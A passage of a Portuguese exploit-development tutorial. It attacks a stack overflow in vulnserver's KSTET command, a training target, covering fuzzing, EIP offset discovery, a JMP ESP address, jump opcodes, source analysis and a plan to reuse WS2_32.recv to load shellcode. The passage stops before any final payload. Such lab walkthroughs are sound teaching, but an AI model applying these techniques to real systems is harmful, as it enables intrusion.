<span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://www.linkedin.com/in/helviojunior" aria-label="linkedin" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.youtube.com/@Sec4US" aria-label="youtube" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://github.com/helviojunior" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['helvio.junior','sec4us.com.br'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/it"> It </a> </span> <span> <a href="/security"> Security </a> </span> <span> <a href="/criacao-de-exploits"> Criacao-de-exploits </a> </span> <span>Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Helvio Junior (m4v3r1ck) </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Feb 17, 2019, 8:00 AM -0300" prep="on" > Feb 17, 2019 <i class="unloaded">2019-02-17T08:00:33-03:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Aug 17, 2023, 12:19 AM -0300" prefix="Updated " > Aug 17, 2023 <i class="unloaded">2023-08-17T00:19:29-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4830 words">26 min</span></div></div><div class="post-content"><p>Ola pessoal,</p><p>Neste post vamos dar continuidade a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim no post anterior (<a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter </a>) fizemos a exploração deste mesmo server com egghunter e neste iremos explorar a reutilização da função WS2_32.recv para reler do nosso socket o shellcode e executa-lo.</p><p>Antes de dar continuidade eu gostaria de dar os créditos ao autor que me inspirou a criar este post Kevin Kirsche, segue abaixo o link do post original:</p><p><a href="https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/" target="_blank" rel="noopener noreferrer">https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/</a></p><p></p><h2>O Exploit</h2><h3>0x01 - Fuzzing</h3><p>Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver.</p><p>Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP.</p><p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br /> Welcome to Vulnerable Server! Enter HELP for help.<br /> [/sourcecode]</p><p>Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis</p><p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br /> Welcome to Vulnerable Server! Enter HELP for help.<br /> HELP<br /> Valid Commands:<br /> HELP<br /> STATS [stat_value]<br /> RTIME [rtime_value]<br /> LTIME [ltime_value]<br /> SRUN [srun_value]<br /> TRUN [trun_value]<br /> GMON [gmon_value]<br /> GDOG [gdog_value]<br /> KSTET [kstet_value]<br /> GTER [gter_value]<br /> HTER [hter_value]<br /> LTER [lter_value]<br /> KSTAN [lstan_value]<br /> EXIT<br /> [/sourcecode]</p><p>Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão</p><p><a href="/assets/2019/02/00-2019-02-16_124240.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 682 348'%3E%3C/svg%3E" data-src="/assets/2019/02/00-2019-02-16_124240.png" alt="" width="682" height="348" class="lazyload" data-proofer-ignore></a></p><p>Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados.</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/01-fuzz.spk"></script></p><p>Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0<br /> Total Number of Strings is 681<br /> Fuzzing<br /> Fuzzing Variable 0:0<br /> line read=Welcome to Vulnerable Server! Enter HELP for help.<br /> Fuzzing Variable 0:1<br /> Variablesize= 5004<br /> Fuzzing Variable 0:2<br /> Variablesize= 5005<br /> Fuzzing Variable 0:3<br /> Variablesize= 21<br /> ^C<br /> [/sourcecode]</p><p>Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug.</p><p>[sourcecode language="shell"]Fuzzing Variable 0:1<br /> Variablesize= 5004<br /> [/sourcecode]</p><p>Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger:</p><p><a href="/assets/2019/02/01-2019-02-16_124535.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 956'%3E%3C/svg%3E" data-src="/assets/2019/02/01-2019-02-16_124535.png" alt="" width="1120" height="956" class="lazyload" data-proofer-ignore></a></p><p>Pode-se observar que o spike enviou a requisição conforme abaixo:</p><p>[sourcecode language="shell"]KSTET /.:/AAAAAAAAA........<br /> [/sourcecode]</p><p>Provavelmente 5000 A com o prefixo /.:/</p><p>Vamos duplicar este exploit em python criando então uma prova de conceito (PoC)</p><p>&nbsp;</p><h3>0x02 - Exploit de PoC</h3><p>Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres <strong>/.:/ </strong>então vamos reproduzir isso:<strong><br /> </strong></p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/02-poc.py"></script></p><p>Executando nosso PoC temos a seguinte saída:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# ./02-poc.py<br /> [*] Enviando requisicao maliciosa ...<br /> [/sourcecode]</p><p>E o crash ocorreu:<br /> <a href="/assets/2019/02/01-2019-02-16_124535.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 956'%3E%3C/svg%3E" data-src="/assets/2019/02/01-2019-02-16_124535.png" alt="" width="1120" height="956" class="lazyload" data-proofer-ignore></a></p><p>Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre.</p><h3>0x03 - Determinando o tipo de Exploit e o Offset de controle</h3><p>Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por:</p><p>[sourcecode language="shell"]41414141<br /> [/sourcecode]</p><p>Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como <em>vanilla EIP overwrite</em>. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da <em>metasploit</em> para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu.</p><p>Gerando o buffer único:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_create -l 5000<br /> [/sourcecode]</p><p>Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 03-find_offset.py"></script></p><p>Execute este script e veja como ficou o registrador EIP:</p><p><a href="/assets/2019/02/03-2019-02-16_135338.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 505 319'%3E%3C/svg%3E" data-src="/assets/2019/02/03-2019-02-16_135338.png" alt="" width="505" height="319" class="lazyload" data-proofer-ignore></a></p><p>Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_offset -l 5000 -q 41326341<br /> [*] Exact match at offset 66<br /> [/sourcecode]</p><p>Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto.</p><h3>0x04 - Verificando o Offset</h3><p>Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo:<br /> <script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 04-checking_eip.py"></script></p><p>E executamos ele obtendo o resultado abaixo:</p><p><a href="/assets/2019/02/04-2019-02-16_135808-2.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/04-2019-02-16_135808-2.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><p>Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs.</p><p>Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes:</p><ol><li>Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes<li>Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes</ol><p>Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos.</p><p><strong>Nota importante:</strong> Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros.</p><h3>0x05 - Saltando para nosso Buffer</h3><p>O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte.</p><p>[sourcecode language="shell"]!mona jmp -n -r ESP<br /> [/sourcecode]</p><p>Este comando nos retornou 9 opções</p><p><a href="/assets/2019/02/05-2019-02-17_095741.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 968'%3E%3C/svg%3E" data-src="/assets/2019/02/05-2019-02-17_095741.png" alt="" width="1116" height="968" class="lazyload" data-proofer-ignore></a></p><p>Porém a nossa escolha foi a primeira:</p><p>[sourcecode language="shell"]Log data, item 11<br /> Address=625011AF<br /> Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)<br /> [/sourcecode]</p><p>Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - '\r', 0x0a - '\n'). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional.</p><p>Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian.</p><p>Segue nosso exploit atualizado:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 05-jumping-esp.py"></script></p><p>Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão <strong><em>Goto address in Dissassembler </em></strong>demonstrado abaixo:</p><p><a href="/assets/2019/02/06-2019-02-16_150507.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 236'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150507.png" alt="" width="1120" height="236" class="lazyload" data-proofer-ignore></a></p><p>E digite o endereço da instrução JMP ESP escolhida:</p><p><a href="/assets/2019/02/06-2019-02-16_150539.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 274'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150539.png" alt="" width="1120" height="274" class="lazyload" data-proofer-ignore></a></p><p>Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint.</p><p><a href="/assets/2019/02/06-2019-02-16_150610.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 169'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150610.png" alt="" width="1120" height="169" class="lazyload" data-proofer-ignore></a></p><p>Agora execute o exploit e veja a aplicação parando no breakpoint selecionado</p><p><a href="/assets/2019/02/05-2019-02-17_101711.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 970'%3E%3C/svg%3E" data-src="/assets/2019/02/05-2019-02-17_101711.png" alt="" width="1116" height="970" class="lazyload" data-proofer-ignore></a></p><p>Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status "Breakpoint at essfunc.625011AF" e não outro erro como <em>access violation</em>.</p><p>Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs</p><p><a href="/assets/2019/02/05-2019-02-17_101916.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/05-2019-02-17_101916.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><h3>0x06 - Saltando para o buffer maior</h3><p>Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes)</p><p>Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos.</p><p>Olhando na imagem anterior vemos o seguinte cenário:</p><p>[sourcecode language="shell"]00EDF9F8 43 INC EBX<br /> [/sourcecode]</p><p>Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As?</p><p>[sourcecode language="shell"]00EDF9B2 41 INC ECX<br /> [/sourcecode]</p><p>Então podemos fazer alguns cálculos para realizar a movimentação necessária</p><p>[sourcecode language="shell"]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70<br /> [/sourcecode]</p><p>Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX:</p><p>[sourcecode language="shell"]PUSH ESP<br /> POP EDX<br /> [/sourcecode]</p><p>E posteriormente subtrair 0x46 (decimal 70) de seu valor:</p><p>[sourcecode language="shell"]SUB EDX,0x46<br /> [/sourcecode]</p><p>E por fim saltar para o endereço desejado:</p><p>[sourcecode language="shell"]JMP EDX<br /> [/sourcecode]</p><p>Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada <em>msf-nasm_shell</em> conforme demonstrado abaixo:</p><p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br /> nasm &amp;amp;amp;amp;gt; PUSH ESP<br /> 00000000 54 push esp<br /> nasm &amp;amp;amp;amp;gt; SUB EDX,0x46<br /> 00000000 83EA46 sub edx,byte +0x46<br /> nasm &amp;amp;amp;amp;gt; JMP EDX<br /> 00000000 FFE2 jmp edx<br /> nasm &amp;amp;amp;amp;gt;<br /> [/sourcecode]</p><p>Segue abaixo o exploit atualizado:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 06-stage1-option1.py"></script></p><p>Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP)</p><p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br /> nasm &amp;amp;amp;amp;gt; JMP short -72<br /> 00000000 EBB6 jmp short 0xffffffb8<br /> nasm &amp;amp;amp;amp;gt;<br /> [/sourcecode]</p><p>Segue abaixo a segunda opção:<br /> Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção.</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/06-stage1-option2.py"></script></p><p>Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo:</p><p><a href="/assets/2019/02/06-2019-02-16_150857.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 955'%3E%3C/svg%3E" data-src="/assets/2019/02/06-2019-02-16_150857.png" alt="" width="1120" height="955" class="lazyload" data-proofer-ignore></a></p><p>Neste ponto temos pelo menos 2 formar de continuar com o exploit:</p><ol><li>Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter (este processo é descrito no post <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter </a>)<li>Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Isso parece meio confuso no início, mas não se preocupe mais a frente explicarei mais detalhadamente este processo.</ol><p>Neste post abordaremos a opção 2: reutilização da função WS2_32.recv.</p><h3>0x07 - Entendendo a engenharia e utilização da função WS2_32.recv</h3><p>Não existe outra forma melhor de entender o funcionamento deste processo sem entender o que a nossa aplicação está executando, então vamos ao código da aplicação:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/vulnserver.c"></script></p><p>Analisando o fluxo da aplicação percebemos que a mesma abre um socket na porta especificada, e quando um cliente se conecta é criada uma nova thread que executa a função <em><strong><span class="pl-en">ConnectionHandler</span></strong></em> (aproximadamente linha 160) esta é a função responsável por tratar da conexão do cliente. Indo mais a fundo dentro dessa função, depois da conexão estabelecida a aplicação entre em um loop para tratar as requisições vindas do cliente e dentro do loop chama a função <em><strong>recv</strong></em> que é responsável por receber s dados vindos do nosso cliente através do socket.</p><p>Bom, como a função WS2_32.recv funciona? Se olharmos na documentação do MSDN (<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-recv" target="_blank" rel="noopener noreferrer">localizada aqui</a>) podemos ver o seguinte:</p><p>[sourcecode language="c"]int recv(<br /> SOCKET s,<br /> char *buf,<br /> int len,<br /> int flags<br /> );<br /> [/sourcecode]</p><p>Sendo assim a função <em><strong>recv</strong> </em>recebe 4 parâmetros sendo eles:</p><ol><li><strong>SOCKET s</strong>: file descriptor do socket da conexão do cliente;<li><strong>char *buf</strong>: ponteiro de memória do buffer para o qual os dados serão recebidos e copiados;<li><strong>int len</strong>: tamanho dos dados a serem recebidos do socket;<li><strong>int flags</strong>: as flags influenciam no comportamento da função, para nosso estudo podemos ignorar estes parâmetro.</ol><p>Continuando na análise do nosso código vemos que a função WS2_32.recv (em nosso código) é chamada conforme abaixo:</p><p>[sourcecode language="c"]Result = recv(Client, RecvBuf, RecvBufLen, 0);<br /> [/sourcecode]</p><p>O que vamos colocar como foco é o parâmetro RecvBufLen que um pouco antes é definido como:</p><p>[sourcecode language="c"]int RecvBufLen = DEFAULT_BUFLEN;<br /> [/sourcecode]</p><p>Que por sua vez a variável estática DEFAULT_BUFLEN fou definida anteriormente como:</p><p>[sourcecode language="c"]#define DEFAULT_BUFLEN 4096<br /> [/sourcecode]</p><p>Isso indica que nossa aplicação realiza a leitura de 4096 bytes. Afe!!!, não entendi nada mas nosso overflow não está ocorrendo com 66 bytes? Da onde vem esse 4096? Vamos continuar a análise que espero explicar isso.</p><p>Extraindo a sessão de código que trata do nosso comando vulnerável KSTET temos o seguinte código:</p><p>[sourcecode language="c"]} else if (strncmp(RecvBuf, &quot;KSTET &quot;, 6) == 0) {<br /> char *KstetBuf = malloc(100);<br /> strncpy(KstetBuf, RecvBuf, 100);<br /> memset(RecvBuf, 0, DEFAULT_BUFLEN);<br /> Function2(KstetBuf);<br /> SendResult = send( Client, &quot;KSTET SUCCESSFUL\n&quot;, 17, 0 );<br /> }<br /> [/sourcecode]</p><p>Vamos estudar linha a linha:</p><ul><li><strong>char *KstetBuf = malloc(100)</strong>: cria a variável KstetBuf e aloca uma espaço de memória de 100 bytes para ela;<li><strong>strncpy(KstetBuf, RecvBuf, 100)</strong>: copia os 100 primeiros bytes do buffer recebido pelo socket para essa variável recem criada <em>KstetBuf</em> ;<li><strong>memset(RecvBuf, 0, DEFAULT_BUFLEN)</strong>: preenche todo o buffer (variável <em>RecvBuf</em>) com zeros;<li><strong>Function2(KstetBuf)</strong>: chama a função <em>Function2</em> passando como parâmetro a variável KstetBuf que por sua vez detem 100 bytes;</ul><p>Até ai tudo OK, sem nenhuma vulnerabilidade e nhum problema, agora vamos analisar o código da função chamada <em><strong>Function2</strong> </em>conforme abaixo:</p><p>[sourcecode language="c"]void Function2(char *Input) {<br /> char Buffer2S[60];<br /> strcpy(Buffer2S, Input);<br /> }<br /> [/sourcecode]</p><p>Mais uma vez vamos a análise linha a linha:</p><ul><li><strong>char Buffer2S[60]</strong>: cria uma variável com tamanho fixo de 60 bytes;<li><strong>strcpy(Buffer2S, Input)</strong>: realiza a copia do parâmetro recebido, de nome Input.</ul><p>Nesta sessão podemos perceber a vulnerabilidade no strcpy onde se tenta copiar os 100 bytes passados como parâmetro para dentro de um buffer de 60 bytes. Sendo assim novo overflow consiste em controlar o fluxo da aplicação que ao invés dela continuar seu fluxo normal e executar o código <em><strong>SendResult = send( Client, "KSTET SUCCESSFUL\n", 17, 0 )</strong></em> a mesma vai saltar para o endereço que desejamos e controlamos no EIP.</p><p>Isso explica algumas coisas, o buffer de 66 bytes, pois nunca é o tamanho exato do tamanho da variável que houve o overflow (caso tenha duvida ou não esteja muito familiarizado com este processo sugiro a leitura do post que fiz explicando a teoria do buffer overflow <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-0-um-pouco-de-teoria/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 0 – Um pouco de teoria</a>). Explica também porque temos um buffer tão limitado de 20 bytes após o EIP.</p><p>Até agora entendemos o porque o overflow ocorre, o porque temos um tamanho tão limitado após o EIP, mas ainda não entramos no como utilizaremos a função <strong><em>recv</em> </strong>a nosso favor para receber o nosso shellcode.</p><p>Como vimos a aplicação em seu fluxo normal executa as seuintes operações:</p><ol><li>Realiza o bind na porta desejada (por padrão 9999);<li>Quando o cliente se conecta chama a função <em><strong><span class="pl-en">ConnectionHandler</span></strong></em> em uma nova thread para tratar das requisições do cliente;<li>Dentro da função <em><strong><span class="pl-en">ConnectionHandler</span></strong></em>, fica em um loop infinito chamando a função WS2_32.recv para receber os dados do cliente e trata os dados recebidos conforme os IFs;<li>Em nosso comando vulnerável (KSTET) chama a função de nome <em><strong>Function2</strong>;</em><li>Depois retorna dados para o cliente;</ol><p>O que pretendemos fazer é alterar este fluxo que depois do nosso <em>crash</em> possamos chamar de forma deliberada a função <em><strong>recv</strong> </em>lendo um novo buffer de nosso cliente, só que dessa vez sem os limitadores impostos pela aplicação, pois nós que definiremos o tamanho do buffer, e mandando que o <em><strong>recv</strong> </em>escreva os novos dados recebidos (que será nosso shellcode) em uma área estratégica para que possamos executa-lo.</p><p>Basicamente temos a seguinte anatomia após o nosso overflow:</p><ul><li>66 bytes: que será nosso segundo estágio<li>4 bytes: endereço do EIP<li>20 bytes: stagio1 que fará o JUMP para o segundo estágio</ul><p>Dentro do segundo estágio (66 bytes) nos vamos chamar a função WS2_32.recv para que ela leia do nosso socket mais 520 bytes e o grave no endereço de memória antes do final dos 66 bytes para que após a leitura destes dados possamos executar o nosso shellcode.</p><p>Vamos dar uma olhada na imagem abaixo logo antes da chamada da função <em><strong>recv</strong></em></p><p><a href="/assets/2019/02/07-2019-02-17_131457.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 664'%3E%3C/svg%3E" data-src="/assets/2019/02/07-2019-02-17_131457.png" alt="" 